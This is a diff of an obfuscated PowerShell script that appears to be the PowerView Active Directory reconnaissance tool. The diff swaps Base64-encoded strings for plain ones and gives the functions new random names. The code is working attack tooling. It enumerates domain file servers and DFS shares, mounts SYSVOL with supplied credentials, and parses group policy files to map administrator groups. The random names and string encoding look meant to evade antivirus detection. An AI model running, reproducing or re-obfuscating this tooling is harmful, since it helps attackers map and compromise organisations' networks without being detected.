         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),
+        $SearchScope = 'Subtree',
 
         [ValidateRange(1, 10000)]
         [Int]
@@ -7005,12 +7009,12 @@ function xgedtj {
     )
 
     BEGIN {
-        function srrrno {
+        function tyynww {
             
             Param([String]$Path)
 
-            if ($Path -and ($Path.split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFw=")))).Count -ge 3)) {
-                $Temp = $Path.split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFw="))))[2]
+            if ($Path -and ($Path.split('\\').Count -ge 3)) {
+                $Temp = $Path.split('\\')[2]
                 if ($Temp -and ($Temp -ne '')) {
                     $Temp
                 }
@@ -7018,36 +7022,36 @@ function xgedtj {
         }
 
         $SearcherArguments = @{
-            ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCYoc2FtQWNjb3VudFR5cGU9ODA1MzA2MzY4KSghKHVzZXJBY2NvdW50Q29udHJvbDoxLjIuODQwLjExMzU1Ni4xLjQuODAzOj0yKSkofChob21lZGlyZWN0b3J5PSopKHNjcmlwdHBhdGg9KikocHJvZmlsZXBhdGg9KikpKQ==")))
-            ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aG9tZWRpcmVjdG9yeSxzY3JpcHRwYXRoLHByb2ZpbGVwYXRo")))
+            'LDAPFilter' = '(&(samAccountType=805306368)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(|(homedirectory=*)(scriptpath=*)(profilepath=*)))'
+            'Properties' = 'homedirectory,scriptpath,profilepath'
         }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $SearchBase }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
+        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
+        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
     }
 
     PROCESS {
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) {
+        if ($PSBoundParameters['Domain']) {
             ForEach ($TargetDomain in $Domain) {
-                $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $TargetDomain
-                $UserSearcher = ltdynu @SearcherArguments
+                $SearcherArguments['Domain'] = $TargetDomain
+                $UserSearcher = vydvzz @SearcherArguments
                 
-                $(ForEach($UserResult in $UserSearcher.FindAll()) {if ($UserResult.Properties[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aG9tZWRpcmVjdG9yeQ==")))]) {srrrno($UserResult.Properties[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aG9tZWRpcmVjdG9yeQ==")))])}if ($UserResult.Properties[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("c2NyaXB0cGF0aA==")))]) {srrrno($UserResult.Properties[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("c2NyaXB0cGF0aA==")))])}if ($UserResult.Properties[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("cHJvZmlsZXBhdGg=")))]) {srrrno($UserResult.Properties[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("cHJvZmlsZXBhdGg=")))])}}) | Sort-Object -Unique
+                $(ForEach($UserResult in $UserSearcher.FindAll()) {if ($UserResult.Properties['homedirectory']) {tyynww($UserResult.Properties['homedirectory'])}if ($UserResult.Properties['scriptpath']) {tyynww($UserResult.Properties['scriptpath'])}if ($UserResult.Properties['profilepath']) {tyynww($UserResult.Properties['profilepath'])}}) | Sort-Object -Unique
             }
         }
         else {
-            $UserSearcher = ltdynu @SearcherArguments
-            $(ForEach($UserResult in $UserSearcher.FindAll()) {if ($UserResult.Properties[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aG9tZWRpcmVjdG9yeQ==")))]) {srrrno($UserResult.Properties[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aG9tZWRpcmVjdG9yeQ==")))])}if ($UserResult.Properties[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("c2NyaXB0cGF0aA==")))]) {srrrno($UserResult.Properties[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("c2NyaXB0cGF0aA==")))])}if ($UserResult.Properties[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("cHJvZmlsZXBhdGg=")))]) {srrrno($UserResult.Properties[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("cHJvZmlsZXBhdGg=")))])}}) | Sort-Object -Unique
+            $UserSearcher = vydvzz @SearcherArguments
+            $(ForEach($UserResult in $UserSearcher.FindAll()) {if ($UserResult.Properties['homedirectory']) {tyynww($UserResult.Properties['homedirectory'])}if ($UserResult.Properties['scriptpath']) {tyynww($UserResult.Properties['scriptpath'])}if ($UserResult.Properties['profilepath']) {tyynww($UserResult.Properties['profilepath'])}}) | Sort-Object -Unique
         }
     }
 }
 
 
-function ycttax {
+function pjswbr {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
@@ -7074,7 +7078,7 @@ function ycttax {
 
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),
+        $SearchScope = 'Subtree',
 
         [ValidateRange(1, 10000)]
         [Int]
@@ -7093,20 +7097,20 @@ function ycttax {
 
         [ValidateSet('All', 'V1', '1', 'V2', '2')]
         [String]
-        $Version = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWxs")))
+        $Version = 'All'
     )
 
     BEGIN {
         $SearcherArguments = @{}
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $SearchBase }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
+        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
+        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
 
-        function iyptcx {
+        function qdlpkp {
             [CmdletBinding()]
             Param(
                 [Byte[]]
@@ -7136,8 +7140,8 @@ function ycttax {
                 $blob_data_end = $blob_data_start + $blob_data_size - 1
                 $blob_data = $bin[$blob_data_start..$blob_data_end]
                 switch -wildcard ($blob_name) {
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XHNpdGVyb290"))) {  }
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XGRvbWFpbnJvb3Qq"))) {
+                    "\siteroot" {  }
+                    "\domainroot*" {
                         
                         
                         $root_or_link_guid_start = 0
@@ -7244,16 +7248,16 @@ function ycttax {
                             $share_name_end = $share_name_start + $share_name_size - 1
                             $share_name = [System.Text.Encoding]::Unicode.GetString($dfs_targetlist_blob[$share_name_start..$share_name_end])
 
-                            $target_list += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFwkc2VydmVyX25hbWVcJHNoYXJlX25hbWU=")))
+                            $target_list += "\\$server_name\$share_name"
                             $t_offset = $share_name_end + 1
                         }
                     }
                 }
                 $offset = $blob_data_end + 1
                 $dfs_pkt_properties = @{
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TmFtZQ=="))) = $blob_name
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJlZml4"))) = $prefix
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGFyZ2V0TGlzdA=="))) = $target_list
+                    'Name' = $blob_name
+                    'Prefix' = $prefix
+                    'TargetList' = $target_list
                 }
                 $object_list += New-Object -TypeName PSObject -Property $dfs_pkt_properties
                 $prefix = $Null
@@ -7265,7 +7269,7 @@ function ycttax {
             $object_list | ForEach-Object {
                 if ($_.TargetList) {
                     $_.TargetList | ForEach-Object {
-                        $servers += $_.split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))))[2]
+                        $servers += $_.split('\')[2]
                     }
                 }
             }
@@ -7273,7 +7277,7 @@ function ycttax {
             $servers
         }
 
-        function cdjgxo {
+        function khohfh {
             [CmdletBinding()]
             Param(
                 [String]
@@ -7286,7 +7290,7 @@ function ycttax {
                 $Server,
 
                 [String]
-                $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),
+                $SearchScope = 'Subtree',
 
                 [Int]
                 $ResultPageSize = 200,
@@ -7302,11 +7306,11 @@ function ycttax {
                 $Credential = [Management.Automation.PSCredential]::Empty
             )
 
-            $DFSsearcher = ltdynu @PSBoundParameters
+            $DFSsearcher = vydvzz @PSBoundParameters
 
             if ($DFSsearcher) {
                 $DFSshares = @()
-                $DFSsearcher.filter = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCYob2JqZWN0Q2xhc3M9ZlREZnMpKQ==")))
+                $DFSsearcher.filter = '(&(objectClass=fTDfs))'
 
                 try {
                     $Results = $DFSSearcher.FindAll()
@@ -7317,42 +7321,42 @@ function ycttax {
 
                         $DFSshares += $RemoteNames | ForEach-Object {
                             try {
-                                if ( $_.Contains(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA==")))) ) {
-                                    New-Object -TypeName PSObject -Property @{([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TmFtZQ==")))=$Properties.name[0];([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVtb3RlU2VydmVyTmFtZQ==")))=$_.split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))))[2]}
+                                if ( $_.Contains('\') ) {
+                                    New-Object -TypeName PSObject -Property @{'Name'=$Properties.name[0];'RemoteServerName'=$_.split('\')[2]}
                                 }
                             }
                             catch {
-                                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5ERlNTaGFyZV0gR2V0LURvbWFpbkRGU1NoYXJlVjEgZXJyb3IgaW4gcGFyc2luZyBERlMgc2hhcmUgOiB7MH0="))) -f $_)
+                                Write-Verbose ("[Get-DomainDFSShare] Get-DomainDFSShareV1 error in parsing DFS share : {0}" -f $_)
                             }
                         }
                     }
                     if ($Results) {
                         try { $Results.dispose() }
                         catch {
-                            Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5ERlNTaGFyZV0gR2V0LURvbWFpbkRGU1NoYXJlVjEgZXJyb3IgZGlzcG9zaW5nIG9mIHRoZSBSZXN1bHRzIG9iamVjdDogezB9"))) -f $_)
+                            Write-Verbose ("[Get-DomainDFSShare] Get-DomainDFSShareV1 error disposing of the Results object: {0}" -f $_)
                         }
                     }
                     $DFSSearcher.dispose()
 
                     if ($pkt -and $pkt[0]) {
-                        iyptcx $pkt[0] | ForEach-Object {
+                        qdlpkp $pkt[0] | ForEach-Object {
                             
                             
                             
-                            if ($_ -ne ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bnVsbA==")))) {
-                                New-Object -TypeName PSObject -Property @{([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TmFtZQ==")))=$Properties.name[0];([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVtb3RlU2VydmVyTmFtZQ==")))=$_}
+                            if ($_ -ne 'null') {
+                                New-Object -TypeName PSObject -Property @{'Name'=$Properties.name[0];'RemoteServerName'=$_}
                             }
                         }
                     }
                 }
                 catch {
-                    Write-Warning (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5ERlNTaGFyZV0gR2V0LURvbWFpbkRGU1NoYXJlVjEgZXJyb3IgOiB7MH0="))) -f $_)
+                    Write-Warning ("[Get-DomainDFSShare] Get-DomainDFSShareV1 error : {0}" -f $_)
                 }
-                $DFSshares | Sort-Object -Unique -Property ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVtb3RlU2VydmVyTmFtZQ==")))
+                $DFSshares | Sort-Object -Unique -Property 'RemoteServerName'
             }
         }
 
-        function yhganj {
+        function hltyuy {
             [CmdletBinding()]
             Param(
                 [String]
@@ -7365,7 +7369,7 @@ function ycttax {
                 $Server,
 
                 [String]
-                $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),
+                $SearchScope = 'Subtree',
 
                 [Int]
                 $ResultPageSize = 200,
@@ -7381,45 +7385,45 @@ function ycttax {
                 $Credential = [Management.Automation.PSCredential]::Empty
             )
 
-            $DFSsearcher = ltdynu @PSBoundParameters
+            $DFSsearcher = vydvzz @PSBoundParameters
 
             if ($DFSsearcher) {
                 $DFSshares = @()
-                $DFSsearcher.filter = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCYob2JqZWN0Q2xhc3M9bXNERlMtTGlua3YyKSk=")))
-                $Null = $DFSSearcher.PropertiesToLoad.AddRange((([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bXNkZnMtbGlua3BhdGh2Mg=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bXNERlMtVGFyZ2V0TGlzdHYy")))))
+                $DFSsearcher.filter = '(&(objectClass=msDFS-Linkv2))'
+                $Null = $DFSSearcher.PropertiesToLoad.AddRange(('msdfs-linkpathv2','msDFS-TargetListv2'))
 
                 try {
                     $Results = $DFSSearcher.FindAll()
                     $Results | Where-Object {$_} | ForEach-Object {
                         $Properties = $_.Properties
-                        $target_list = $Properties.([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bXNkZnMtdGFyZ2V0bGlzdHYy")))[0]
+                        $target_list = $Properties.'msdfs-targetlistv2'[0]
                         $xml = [xml][System.Text.Encoding]::Unicode.GetString($target_list[2..($target_list.Length-1)])
                         $DFSshares += $xml.targets.ChildNodes | ForEach-Object {
                             try {
                                 $Target = $_.InnerText
-                                if ( $Target.Contains(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA==")))) ) {
-                                    $DFSroot = $Target.split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))))[3]
-                                    $ShareName = $Properties.([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bXNkZnMtbGlua3BhdGh2Mg==")))[0]
-                                    New-Object -TypeName PSObject -Property @{([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TmFtZQ==")))=([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JERGU3Jvb3QkU2hhcmVOYW1l")));([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVtb3RlU2VydmVyTmFtZQ==")))=$Target.split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))))[2]}
+                                if ( $Target.Contains('\') ) {
+                                    $DFSroot = $Target.split('\')[3]
+                                    $ShareName = $Properties.'msdfs-linkpathv2'[0]
+                                    New-Object -TypeName PSObject -Property @{'Name'="$DFSroot$ShareName";'RemoteServerName'=$Target.split('\')[2]}
                                 }
                             }
                             catch {
-                                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5ERlNTaGFyZV0gR2V0LURvbWFpbkRGU1NoYXJlVjIgZXJyb3IgaW4gcGFyc2luZyB0YXJnZXQgOiB7MH0="))) -f $_)
+                                Write-Verbose ("[Get-DomainDFSShare] Get-DomainDFSShareV2 error in parsing target : {0}" -f $_)
                             }
                         }
                     }
                     if ($Results) {
                         try { $Results.dispose() }
                         catch {
-                            Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5ERlNTaGFyZV0gRXJyb3IgZGlzcG9zaW5nIG9mIHRoZSBSZXN1bHRzIG9iamVjdDogezB9"))) -f $_)
+                            Write-Verbose ("[Get-DomainDFSShare] Error disposing of the Results object: {0}" -f $_)
                         }
                     }
                     $DFSSearcher.dispose()
                 }
                 catch {
-                    Write-Warning (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5ERlNTaGFyZV0gR2V0LURvbWFpbkRGU1NoYXJlVjIgZXJyb3IgOiB7MH0="))) -f $_)
+                    Write-Warning ("[Get-DomainDFSShare] Get-DomainDFSShareV2 error : {0}" -f $_)
                 }
-                $DFSshares | Sort-Object -Unique -Property ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVtb3RlU2VydmVyTmFtZQ==")))
+                $DFSshares | Sort-Object -Unique -Property 'RemoteServerName'
             }
         }
     }
@@ -7427,27 +7431,27 @@ function ycttax {
     PROCESS {
         $DFSshares = @()
 
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) {
+        if ($PSBoundParameters['Domain']) {
             ForEach ($TargetDomain in $Domain) {
-                $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $TargetDomain
-                if ($Version -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("YWxsfDE=")))) {
-                    $DFSshares += cdjgxo @SearcherArguments
+                $SearcherArguments['Domain'] = $TargetDomain
+                if ($Version -match 'all|1') {
+                    $DFSshares += khohfh @SearcherArguments
                 }
-                if ($Version -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("YWxsfDI=")))) {
-                    $DFSshares += yhganj @SearcherArguments
+                if ($Version -match 'all|2') {
+                    $DFSshares += hltyuy @SearcherArguments
                 }
             }
         }
         else {
-            if ($Version -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("YWxsfDE=")))) {
-                $DFSshares += cdjgxo @SearcherArguments
+            if ($Version -match 'all|1') {
+                $DFSshares += khohfh @SearcherArguments
             }
-            if ($Version -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("YWxsfDI=")))) {
-                $DFSshares += yhganj @SearcherArguments
+            if ($Version -match 'all|2') {
+                $DFSshares += hltyuy @SearcherArguments
             }
         }
 
-        $DFSshares | Sort-Object -Property (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVtb3RlU2VydmVyTmFtZQ=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TmFtZQ==")))) -Unique
+        $DFSshares | Sort-Object -Property ('RemoteServerName','Name') -Unique
     }
 }
 
@@ -7458,7 +7462,7 @@ function ycttax {
 
 
 
-function jsaijp {
+function nnsvsg {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
@@ -7484,50 +7488,50 @@ function jsaijp {
 
     PROCESS {
         try {
-            if (($GptTmplPath -Match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFxcXC4qXFwuKg==")))) -and ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))])) {
-                $SysVolPath = (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFx7MH1cU1lTVk9M"))) -f $((New-Object System.Uri($GptTmplPath)).Host))
+            if (($GptTmplPath -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
+                $SysVolPath = ("\\{0}\SYSVOL" -f $((New-Object System.Uri($GptTmplPath)).Host))
                 if (-not $MappedPaths[$SysVolPath]) {
                     
-                    jymmbe -Path $SysVolPath -Credential $Credential
+                    ehlhmp -Path $SysVolPath -Credential $Credential
                     $MappedPaths[$SysVolPath] = $True
                 }
             }
 
             $TargetGptTmplPath = $GptTmplPath
-            if (-not $TargetGptTmplPath.EndsWith(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LmluZg=="))))) {
-                $TargetGptTmplPath += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XE1BQ0hJTkVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcU2VjRWRpdFxHcHRUbXBsLmluZg==")))
+            if (-not $TargetGptTmplPath.EndsWith('.inf')) {
+                $TargetGptTmplPath += '\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf'
             }
 
-            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1HcHRUbXBsXSBQYXJzaW5nIEdwdFRtcGxQYXRoOiAkVGFyZ2V0R3B0VG1wbFBhdGg=")))
+            Write-Verbose "[Get-GptTmpl] Parsing GptTmplPath: $TargetGptTmplPath"
 
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T3V0cHV0T2JqZWN0")))]) {
-                $Contents = dhbtba -Path $TargetGptTmplPath -OutputObject -ErrorAction Stop
+            if ($PSBoundParameters['OutputObject']) {
+                $Contents = bbcezn -Path $TargetGptTmplPath -OutputObject -ErrorAction Stop
                 if ($Contents) {
-                    $Contents | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UGF0aA=="))) $TargetGptTmplPath
+                    $Contents | Add-Member Noteproperty 'Path' $TargetGptTmplPath
                     $Contents
                 }
             }
             else {
-                $Contents = dhbtba -Path $TargetGptTmplPath -ErrorAction Stop
+                $Contents = bbcezn -Path $TargetGptTmplPath -ErrorAction Stop
                 if ($Contents) {
-                    $Contents[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UGF0aA==")))] = $TargetGptTmplPath
+                    $Contents['Path'] = $TargetGptTmplPath
                     $Contents
                 }
             }
         }
         catch {
-            Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1HcHRUbXBsXSBFcnJvciBwYXJzaW5nICRUYXJnZXRHcHRUbXBsUGF0aCA6IHswfQ=="))) -f $_)
+            Write-Verbose ("[Get-GptTmpl] Error parsing $TargetGptTmplPath : {0}" -f $_)
         }
     }
 
     END {
         
-        $MappedPaths.Keys | ForEach-Object { erbqbk -Path $_ }
+        $MappedPaths.Keys | ForEach-Object { oqraoh -Path $_ }
     }
 }
 
 
-function oahmtk {
+function zerwqv {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
@@ -7550,11 +7554,11 @@ function oahmtk {
 
     PROCESS {
         try {
-            if (($GroupsXMLPath -Match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFxcXC4qXFwuKg==")))) -and ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))])) {
-                $SysVolPath = (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFx7MH1cU1lTVk9M"))) -f $((New-Object System.Uri($GroupsXMLPath)).Host))
+            if (($GroupsXMLPath -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
+                $SysVolPath = ("\\{0}\SYSVOL" -f $((New-Object System.Uri($GroupsXMLPath)).Host))
                 if (-not $MappedPaths[$SysVolPath]) {
                     
-                    jymmbe -Path $SysVolPath -Credential $Credential
+                    ehlhmp -Path $SysVolPath -Credential $Credential
                     $MappedPaths[$SysVolPath] = $True
                 }
             }
@@ -7562,34 +7566,34 @@ function oahmtk {
             [XML]$GroupsXMLcontent = Get-Content -Path $GroupsXMLPath -ErrorAction Stop
 
             
-            $GroupsXMLcontent | Select-Xml ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("L0dyb3Vwcy9Hcm91cA=="))) | Select-Object -ExpandProperty node | ForEach-Object {
+            $GroupsXMLcontent | Select-Xml "/Groups/Group" | Select-Object -ExpandProperty node | ForEach-Object {
 
                 $Groupname = $_.Properties.groupName
 
                 
                 $GroupSID = $_.Properties.groupSid
                 if (-not $GroupSID) {
-                    if ($Groupname -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWRtaW5pc3RyYXRvcnM=")))) {
-                        $GroupSID = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTQ0")))
+                    if ($Groupname -match 'Administrators') {
+                        $GroupSID = 'S-1-5-32-544'
                     }
-                    elseif ($Groupname -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVtb3RlIERlc2t0b3A=")))) {
-                        $GroupSID = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTU1")))
+                    elseif ($Groupname -match 'Remote Desktop') {
+                        $GroupSID = 'S-1-5-32-555'
                     }
-                    elseif ($Groupname -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3Vlc3Rz")))) {
